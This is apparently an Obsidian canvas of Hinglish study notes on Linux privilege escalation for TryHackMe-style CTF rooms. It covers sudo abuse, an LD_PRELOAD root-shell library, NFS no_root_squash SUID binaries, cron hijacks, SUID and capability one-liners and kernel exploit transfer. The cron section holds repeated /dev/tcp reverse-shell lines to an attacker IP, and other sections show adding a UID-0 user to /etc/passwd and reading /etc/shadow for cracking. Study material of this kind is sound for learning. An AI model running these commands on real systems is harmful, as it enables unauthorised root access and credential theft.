{
	"nodes":[
		{"id":"541c73281fe379d2","type":"text","text":" 1. `/etc/shadow` Linux ki **bahut important security file** hoti hai. Isme **users ke encrypted (hashed) passwords** aur password policy ki information hoti hai.\n 2. \n''\n","x":640,"y":-1400,"width":434,"height":320},
		{"id":"0d43d4d2e4467af5","type":"text","text":"## 🔥 CRUX (Flag Kaise Dhundhein)\n\n**Root banne ke baad flag kis jagah hoti hai, yeh jaan-ne ke liye koi \"rule book\" nahi hai. Par THM aur CTF rooms mein kuch **common locations** hoti hain.**\n\n---\n\n## 🎯 Sabse Pehle Yeh Try Karo:\n\n### 1. Root Directory Check Karo:\n\nbash\n\nls -la /root/\n\n### 2. Home Directories Check Karo:\n\nbash\n\nls -la /home/*/\n\n### 3. Temporary Folder Check Karo:\n\nbash\n\nls -la /tmp/\n\n### 4. Web Root Check Karo (Agar Web Server Ho):\n\nbash\n\nls -la /var/www/html/\n\n### 5. Flag Pattern Search Karo (Poori System Mein):\n\nbash\n\nfind / -name \"flag*\" 2>/dev/null\n\n### 6. `.txt` Files Dhundho:\n\nbash\n\nfind / -name \"*.txt\" 2>/dev/null | grep -v snap\n\n### 7. Content Search Karo (THM Flag Format):\n\nbash\n\ngrep -r \"THM{\" / 2>/dev/null","x":-400,"y":-2680,"width":525,"height":1160},
		{"id":"f36454afcfc540dd","type":"text","text":"# root milne ke baad flag kais dhunhde","x":-385,"y":-1320,"width":510,"height":80},
		{"id":"18db963f01a2a046","type":"text","text":"# sudo ","x":887,"y":480,"width":118,"height":50,"color":"4"},
		{"id":"2a232103e385ac42","type":"text","text":"**Basic Sudo Escalation = Jab tu `sudo -l` se dekhta hai ki tu kaunsi commands root ki tarah chala sakta hai, aur un commands ka fayda utha kar root shell le leta hai.**\n\n---\n\n## 🧠 Pehle Samjho: Sudo Kya Hai?\n\n- **Sudo** = \"Super User DO\".\n    \n- Ye ek aisa tool hai jo ek normal user ko **kuch specific commands** root (admin) ki tarah chalane ki permission deta hai.\n    \n- Jaise: Tu `cat` command root ki tarah chala sakta hai, toh tu **/etc/shadow** (jisme sabke passwords ke hashes hote hain) padh sakta hai.\n    \n\n---\n\n## 🎯 Ab Samjho: Isme PrivEsc Kaise Karte Hain?\n\nJab tu `sudo -l` run karta hai, toh output kuch aisa aata hai:\n\ntext\n\nUser john may run the following commands on this host:\n    (ALL) NOPASSWD: /bin/cat\n\nIska matlab:\n\n- Tu **root** ki tarah `cat` command chala sakta hai.\n    \n- **NOPASSWD** = Bina password ke.\n    \n- Ab tu root ki tarah koi bhi file padh sakta hai.\n    \n\n---\n\n## 🛠️ 3 Tarike Hain Isme PrivEsc Ke (Beginner Level)\n\n### 🔹 Tarika 1: Sensitive Files Padhna (Jaise /etc/shadow)\n\nbash\n\nsudo cat /etc/shadow\n\nIsse tu **password hashes** dekh sakta hai. Inhe crack karke tu kisi aur user (ya root) ka password jaann sakta hai.\n\n---\n\n### 🔹 Tarika 2: Application Function Ka Galat Istemal (Jaise Apache2)\n\nMaan lo tu `apache2` root ki tarah chala sakta hai:\n\nbash\n\nsudo -l\n(ALL) NOPASSWD: /usr/sbin/apache2\n\nAb tu Apache2 ki `-f` option use karke **/etc/shadow** file load kar sakta hai. Error message mein **root hash** leak ho jayega:\n\nbash\n\nsudo apache2 -f /etc/shadow\n\n---\n\n### 🔹 Tarika 3: LD_PRELOAD (Zyada Powerful)\n\nAgar `sudo -l` mein yeh dikhe:\n\ntext\n\nenv_keep+=LD_PRELOAD\n\nToh tu ek **shared library** bana sakta hai jo root shell kholegi.\n\n**Steps:**\n\n1. **C Code Likho** (`shell.c`)\n    \n\nc\n\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}\n\n2. **Compile Karo** (Shared Object)\n    \n\nbash\n\ngcc -fPIC -shared -o shell.so shell.c -nostartfiles\n\n3. **Run Karo** (Kisi bhi sudo command ke saath)\n    \n\nbash\n\nsudo LD_PRELOAD=/home/user/shell.so find\n\n⚠️ **Dhyaan:** `find` command bhi root ki tarah chal sakti hai. Jab tu `LD_PRELOAD` load karta hai, toh tera malicious code pehle run hota hai, jo **root shell** khol deta hai.\n\n---\n\n## 📊 3 Tariko ka Comparison (Yaad Rakho)\n\n|Tarika|Kya Karte Hain?|Kab Kaam Karta Hai?|\n|---|---|---|\n|**Sensitive Files**|`/etc/shadow` padhna|Agar `cat`, `nano`, `vim` sudo mein ho|\n|**App Functions**|Apache2 ki `-f` option se file leak karna|Agar `apache2` sudo mein ho|\n|**LD_PRELOAD**|Malicious shared library load karna|Agar `env_keep+=LD_PRELOAD` ho|\n\n---\n\n## ✅ Tera Action Plan (Jab Bhi `sudo -l` Kare)\n\n1. **Dekho kaunsi commands available hain** (Jaise `cat`, `find`, `vim`, `apache2`).\n    \n2. **GTFOBins** (Google it) mein jaake dekho ki us command se PrivEsc kaise karein.\n    \n3. Agar `LD_PRELOAD` dikhe toh **C code compile** karke root shell le lo.","x":602,"y":785,"width":1039,"height":3055},
		{"id":"0ee0247ab3d48e38","type":"text","text":"# NFS\n","x":2120,"y":-605,"width":250,"height":60,"color":"4"},
		{"id":"97b10469e68c6914","type":"text","text":"##   \n🔥 NFS (Network File System) PrivEsc - CRUX\n\n**NFS PrivEsc = Jab target machine par kisi shared folder mein `no_root_squash` option ho, toh tu us folder mein apni machine se SUID binary bana sakta hai, aur target par run karke root shell le sakta hai.**\n\n---\n\n## 🧠 Pehle Samjho (Noob Version)\n\n|Term|Matlab|\n|---|---|\n|**NFS**|Network shared folder (jaise Google Drive, but Linux version)|\n|**`no_root_squash`**|Shared folder mein root ki files root hi rahengi (normally NFS root ko `nfsnobody` bana deta hai)|\n|**PrivEsc**|Agar tu shared folder mein SUID binary daal sakta hai, toh target par root shell le sakta hai|\n\n---\n\n## 🎯 Step-by-Step (NFS PrivEsc)\n\n### Step 1: Target Par `/etc/exports` Check Karo\n\nbash\n\ncat /etc/exports\n\n**Dekho:** Kisi share mein `no_root_squash` option hai?\n\n**Example Output:**\n\ntext\n\n/tmp/share *(rw,sync,no_root_squash,no_subtree_check)\n\n✅ `no_root_squash` present hai!\n\n---\n\n### Step 2: Apni Machine Par Share Mount Karo\n\nbash\n\n# Target IP = 10.10.10.10\n# Share name = /tmp/share\nmkdir /tmp/nfs_mount\nmount -o rw 10.10.10.10:/tmp/share /tmp/nfs_mount\n\n---\n\n### Step 3: SUID Binary Banao (Apni Machine Par)\n\n**C Code (`shell.c`):**\n\nc\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main() {\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash\");\n    return 0;\n}\n\n**Compile Karo:**\n\nbash\n\ngcc -o shell shell.c\nchmod +s shell   # SUID bit set\n\n---\n\n### Step 4: Binary Ko Mounted Share Mein Copy Karo\n\nbash\n\ncp shell /tmp/nfs_mount/\n\n---\n\n### Step 5: Target Par Binary Run Karo\n\nbash\n\n# Target par\ncd /tmp/share\n./shell\n# Root shell aa jayegi!\nwhoami\n# root\n\n---\n\n## 📊 NFS PrivEsc - Quick Reference\n\n|Step|Command (Apni Machine)|Command (Target)|\n|---|---|---|\n|Check exports|-|`cat /etc/exports`|\n|Mount share|`mkdir /tmp/mount`  <br>`mount -o rw 10.10.10.10:/share /tmp/mount`|-|\n|Create binary|`gcc -o shell shell.c`  <br>`chmod +s shell`|-|\n|Copy binary|`cp shell /tmp/mount/`|-|\n|Run binary|-|`/tmp/share/shell`|\n\n---\n\n## ✅ Tera Action Plan\n\nbash\n\n# 1. Target par exports dekho\ncat /etc/exports\n# 2. Agar no_root_squash ho toh:\n# Apni machine par mount karo\nsudo mount -o rw 10.10.10.10:/share /tmp/nfs_mount\n# 3. SUID binary banao\ngcc -o shell shell.c\nchmod +s shell\n# 4. Copy karo\ncp shell /tmp/nfs_mount/\n# 5. Target par run karo\n/tmp/share/shell","x":2680,"y":560,"width":1480,"height":2260},
		{"id":"e4f2019968f8ab64","type":"text","text":"tu `karen` user hai aur **bina password** ke `find`, `less`, aur `nano` ko **root** ki taraf chala sakta hai. Iska matlab tu **3 alag tarikon** se root ban sakta hai!\n\n---\n\n## 🎯 3 Tarike Hain (Jo bhi easy lage)\n\n|Binary|Command|Result|\n|---|---|---|\n|**find**|`sudo find . -exec /bin/bash \\; -quit`|✅ Root shell|\n|**less**|`sudo less /etc/profile` → `!/bin/bash`|✅ Root shell|\n|**nano**|`sudo nano` → `Ctrl+R` → `Ctrl+X` → `/bin/bash`|✅ Root shell|\n\n---\n\n## ⚡ FASTEST (Copy-Paste)\n\n### Tarika 1: `find` Se Root Shell\n\nbash\n\nsudo find . -exec /bin/bash \\; -quit\n\n### Tarika 2: `less` Se Root Shell\n\nbash\n\nsudo less /etc/profile\n# less ke andar:\n!/bin/bash\n\n### Tarika 3: `nano` Se Root Shell\n\nbash\n\nsudo nano\n# nano ke andar:\nCtrl+R\nCtrl+X\n/bin/bash\n\n---\n\n## ✅ Root Confirm\n\nbash\n\nwhoami\n# Output: root","x":1880,"y":785,"width":620,"height":1528},
		{"id":"5f67046fa6181305","type":"text","text":"**Cron Jobs = Scheduled Tasks (Jaise Alarm Clock).**  \nAgar koi cron job **root** ki taraf se chal raha hai aur tu us script ko modify kar sakta hai, toh tu **root shell** le sakta hai!\n\n---\n\n## 🧠 Pehle Samjho\n\n|Term|Matlab|\n|---|---|\n|**Cron Job**|Time-based scheduled task (jaise har 5 minute pe backup run karna)|\n|**Crontab**|Cron jobs ki list|\n|**PrivEsc**|Agar root ki cron job mein teri writable script hai, toh tu root shell le sakta hai|\n\n---\n\n## 🎯 3 Tarike Hain Cron Jobs Se PrivEsc Ke\n\n---\n\n### 🔹 Tarika 1: Writable Script Modify Karna (Sabse Common)\n\n**Scenario:** Root ki cron job ek script run kar rahi hai, aur tu us script ko modify kar sakta hai.\n\n#### Step 1: Cron Jobs Check Karo\n\nbash\n\ncat /etc/crontab\n\n**Example Output:**\n\ntext\n\n* * * * * root /home/user/backup.sh\n\n→ Har minute root `backup.sh` run karega.\n\n#### Step 2: Script Permissions Check Karo\n\nbash\n\nls -la /home/user/backup.sh\n-rw-rw-r-- 1 user user 100 Jul 26 10:00 backup.sh\n\n✅ **Tu write kar sakta hai!**\n\n#### Step 3: Script Mein Reverse Shell Daalo\n\nbash\n\necho '#!/bin/bash' > /home/user/backup.sh\necho 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /home/user/backup.sh\n\n#### Step 4: Listener Start Karo (Apni Machine)\n\nbash\n\nnc -lvnp 4444\n\n#### Step 5: Cron Run Ho Jaayega → Root Shell Milegi!\n\nbash\n\nwhoami\n# root\n\n---\n\n### 🔹 Tarika 2: Deleted Script Ka Fayda Uthana\n\n**Scenario:** Cron job ek script run kar raha hai jo **exist nahi karti**. Tu us naam ki script bana sakta hai.\n\n#### Step 1: `/etc/crontab` Dekho\n\nbash\n\ncat /etc/crontab\n\ntext\n\n* * * * * root antivirus.sh   # Script delete ho chuki hai!\n\n#### Step 2: Script Banao (Jis PATH mein cron dhundhega)\n\nbash\n\necho '#!/bin/bash' > /home/user/antivirus.sh\necho 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /home/user/antivirus.sh\nchmod +x /home/user/antivirus.sh\n\n#### Step 3: Listener Start Karo\n\nbash\n\nnc -lvnp 4444\n\n#### Step 4: Cron Run Ho Jaayega → Root Shell!\n\n---\n\n### 🔹 Tarika 3: Wildcard Injection (Tar, 7z, Rsync)\n\n**Scenario:** Cron job `tar` use kar raha hai aur tu us folder mein files create kar sakta hai.\n\n#### Step 1: Cron Job Dekho\n\nbash\n\ncat /etc/crontab\n\ntext\n\n* * * * * root tar cf /backup/backup.tar /home/user/*\n\n#### Step 2: Wildcard Exploit Files Banao\n\nbash\n\ncd /home/user\ntouch --checkpoint=1\ntouch --checkpoint-action=exec=sh shell.sh\n\n#### Step 3: `shell.sh` Mein Reverse Shell Daalo\n\nbash\n\necho 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > shell.sh\nchmod +x shell.sh\n\n#### Step 4: Listener Start Karo → Root Shell!\n\n---\n\n## 📊 Quick Checklist (Cron Jobs Ke Liye)\n\n|Step|Command|\n|---|---|\n|1. Crontab check|`cat /etc/crontab`|\n|2. User-specific cron|`crontab -l`|\n|3. Cron directories|`ls -la /etc/cron.d/`  <br>`ls -la /etc/cron.hourly/`|\n|4. Writable scripts|`find / -type f -path \"*/cron*\" -writable 2>/dev/null`|\n|5. Listener start|`nc -lvnp 4444`|\n\n---\n\n## 💡 Golden Rule\n\n> **Cron job root ki taraf se chal rahi hai → Script writable hai → Tu root shell le sakta hai!**\n\n---\n\n## 🔥 Tera Action Plan\n\nbash\n\n# 1. Crontab dekho\ncat /etc/crontab\n# 2. Koi writable script hai?\nls -la /path/to/script\n# 3. Agar writable hai toh reverse shell daalo\necho 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /path/to/script\n# 4. Listener start karo\nnc -lvnp 4444\n# 5. Cron run ho jaayega → root shell!","x":-3880,"y":-1160,"width":1408,"height":1900},
		{"id":"4a7c0794b9d29b93","type":"text","text":"# CRON JOBS","x":-1610,"y":-840,"width":250,"height":60},
		{"id":"8e510641f10b9a9a","type":"text","text":"# CAPABILITIES","x":-896,"y":160,"width":227,"height":50,"color":"4"},
		{"id":"e0e984ff3adec4ce","type":"text","text":"#   kernel exploit\n","x":-460,"y":185,"width":260,"height":50,"color":"4"},
		{"id":"9ba84957a03a5c3e","type":"text","text":"# suid\n","x":-80,"y":185,"width":160,"height":50,"color":"4"},
		{"id":"3a555190794b44a1","type":"text","text":"-> use this command to find the binaries which are suid appliacble -> [find / -type f -perm -04000 -ls 2>/dev/null]\n\n**SUID = Jab kisi file par SUID bit set ho, toh wo file owner ki privileges se run hoti hai. Agar owner root hai, toh tu root jaisa kaam kar sakta hai!**\n\n---\n\n## 🧠 Pehle Samjho: SUID Kya Hai?\n\n|Term|Matlab|\n|---|---|\n|**SUID**|Set User ID|\n|**Kaam**|File owner ki privileges se run hota hai|\n|**Symbol**|`s` (jaise `-rwsr-xr-x`)|\n|**Example**|`/usr/bin/passwd` (root owner, isliye normal user apna password change kar sakta hai)|\n\n---\n\n## 🎯 Is Vector Mein PrivEsc Kaise Karte Hain?\n\n### Step 1: SUID Binaries Dhundho\n\nbash\n\nfind / -type f -perm -04000 -ls 2>/dev/null\n\n### Step 2: GTFOBins Check Karo\n\n- Google \"GTFOBins SUID\" ya yeh link:\n    \n\ntext\n\nhttps://gtfobins.github.io/#/suid\n\n- Wahan dekho kaunsi binaries exploitable hain.\n    \n\n### Step 3: Exploit Karo (2 Tarike Hain)\n\n---\n\n## 🛠️ Tarika 1: `/etc/shadow` Padhna (Password Hashes Leak)\n\nbash\n\n# Agar nano SUID hai toh\nnano /etc/shadow\n# Ya agar find SUID hai toh\nfind / -exec cat /etc/shadow \\;\n\n**Phir:**\n\n1. `/etc/passwd` aur `/etc/shadow` copy karo\n    \n2. `unshadow` se combine karo\n    \n3. John The Ripper se crack karo\n    \n\n---\n\n## 🛠️ Tarika 2: `/etc/passwd` Mein Naya Root User Add Karna\n\n### Step 1: Password Hash Generate Karo\n\nbash\n\nopenssl passwd -1 -salt THM password1\n# Output: $1$THM$WnbwlliCqxFRQepUTCkUT1\n\n### Step 2: `/etc/passwd` Mein Entry Add Karo\n\nbash\n\nnano /etc/passwd\n# Ye line add karo:\nhacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash\n\n### Step 3: Switch to New User\n\nbash\n\nsu hacker\n# Password: password1\nwhoami\n# Output: root\n\n---\n\n## 📊 SUID Binaries List (Common Exploitable)\n\n|Binary|Exploit Method|\n|---|---|\n|`nano`|`/etc/shadow` padho ya `/etc/passwd` edit karo|\n|`vim`|`vim -c ':!/bin/bash'`|\n|`find`|`find . -exec /bin/bash -p \\; -quit`|\n|`bash`|`bash -p`|\n|`python`|`python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'`|\n|`cp`|`/etc/passwd` overwrite karo|\n\n---\n\n## ✅ Tera Action Plan (Is Room Ke Liye)\n\n### Step 1: SUID Binaries Dhundho\n\nbash\n\nfind / -type f -perm -04000 -ls 2>/dev/null\n\n### Step 2: GTFOBins Dekho\n\n- Jo bhi interesting binary ho, GTFOBins par check karo.\n    \n\n### Step 3: Exploit Karo\n\n- Agar `nano` hai → `/etc/passwd` mein root user add karo.\n    \n- Agar `find` hai → root shell le lo.\n    \n- Agar `vim` hai → `vim -c ':!/bin/bash'` se root shell.\n    \n\n---\n\n## 💡 Pro Tip (Yaad Rakho)\n\n**SUID bit set hai matlab binary owner ki privileges se chalegi. Agar owner root hai, toh tu root jaisa kaam kar sakta hai. GTFOBins is your best friend!**\n","x":-200,"y":720,"width":640,"height":3840},
		{"id":"884d05e998a326ef","type":"text","text":"### ⚡ STEPS (Sirf 5)\n\n\n| #   | Kaam               | Command                                                                                                     |\n| --- | ------------------ | ----------------------------------------------------------------------------------------------------------- |\n| 1   | **Kernel version** | `uname -a`                                                                                                  |\n| 2   | **Exploit dhundh** | Google / `searchsploit <version>`                                                                           |\n| 3   | **Transfer**       | `python3 -m http.server 8000` (apni machine) + `wget http://<IP>:8000/exploit.c -O /tmp/exploit.c` (target) |\n| 4   | **Compile**        | `gcc /tmp/exploit.c -o /tmp/exploit && chmod +x /tmp/exploit`                                               |\n| 5   | **Run**            | `/tmp/exploit`                                                                                              |\n\n---\n\n## ⚠️ YAAD RAKH\n\n| Rule                          | Kyun?                     |\n| ----------------------------- | ------------------------- |\n| `/tmp` mein rakho             | Sabko write permission    |\n| Pehle read karo code          | System crash ho sakta hai |\n| Real engagement mein mat karo | Risk hai                  |\n|                               |                           |\n","x":-1029,"y":720,"width":720,"height":655},
		{"id":"9d0cf97ccbccbd1f","type":"text","text":"command to serach->    [getcap -r / 2>/dev/null] \n**Capabilities = SUID ka \"Smart\" version.**  \nSUID mein binary **poori tarah root** ban jaata hai. Capabilities mein sirf **specific permission** di jaati hai (jaise \"network port khol sakta hai\" ya \"file read kar sakta hai\").\n\n**Matlab:** Root ki poori power nahi, sirf **chhoti si special power** milti hai\n\n## ✅ EXPLOITABLE CAPABILITIES (Sirf Yahi Yaad Rakh)\n\n| Capability                 | Binary   | Exploit Command                                                     | PrivEsc?         |\n| -------------------------- | -------- | ------------------------------------------------------------------- | ---------------- |\n| **cap_setuid+ep**          | `vim`    | `vim -c ':py3 import os; os.setuid(0); os.system(\"/bin/bash\")'`     | ✅ **Haan**       |\n| **cap_setuid+ep**          | `python` | `python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'`       | ✅ **Haan**       |\n| **cap_setuid+ep**          | `perl`   | `perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'` | ✅ **Haan**       |\n| **cap_setuid+ep**          | `ruby`   | `ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'`                | ✅ **Haan**       |\n| **cap_dac_read_search+ep** | `tar`    | `tar cvf /tmp/backup.tar /root/flag.txt` (file read)                | ❌ Sirf File Read |\n| **cap_net_raw+ep**         | `ping`   | Kuch nahi kar sakta                                                 | ❌ Useless        |\n\n---\n\n## ⚡ QUICK CHECK COMMAND\n\nbash\n\ngetcap -r / 2>/dev/null\n\n---\n\n## ✅ RULE (Yaad Rakh)\n\n> **Agar `cap_setuid+ep` hai → Root shell possible**  \n> **Agar `cap_dac_read_search+ep` hai → Sirf file read**  \n> **Agar `cap_net_raw+ep` hai → Kuch nahi**\n\n## 1. Check capabilities\n#### getcap -r / 2>/dev/null\n## 2. Agar cap_setuid+ep dikhe toh:\n#### Vim → root shell\n#### Python → root shell\n#### Perl → root shell\n## 3. Agar cap_dac_read_search+ep dikhe toh:\n#### Tar → root files read\n## 4. Agar cap_net_raw+ep dikhe toh:\n#### Sirf ping use kar sakta hai, PrivEsc nahi\n","x":-1920,"y":720,"width":740,"height":1760},
		{"id":"0adaa8535a43ccc5","type":"text","text":"# linux priv sec vectors\n","x":-380,"y":-320,"width":300,"height":60,"color":"4"}
